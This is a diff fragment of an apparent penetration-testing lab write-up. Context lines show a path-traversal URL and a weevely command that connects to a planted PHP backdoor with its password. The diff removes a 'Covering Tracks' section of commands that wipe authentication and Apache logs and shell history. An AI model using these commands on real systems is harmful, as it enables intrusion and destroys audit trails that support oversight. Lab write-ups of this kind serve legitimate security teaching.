@@ -230,16 +230,6 @@ http://192.168.1.1/view.php?page=../../usr/databases/post_exploitation_backdoore
 weevely http://192.168.1.1/view.php?page=../../tmp/backdoored.php b@cKd00r3d
 ```
 
-### Covering Tracks
-```
-cat /dev/null > /var/log/auth.log
-cat /dev/null > /var/log/apache2/access.log
-cat /dev/null > /var/log/apache2/error.log
-cat /dev/null > ~/.bash_history && history -c
-
--c = Clear the history list
-```
-
 ### Vulnerability Patching
 #### Vulnerable Code
 ```
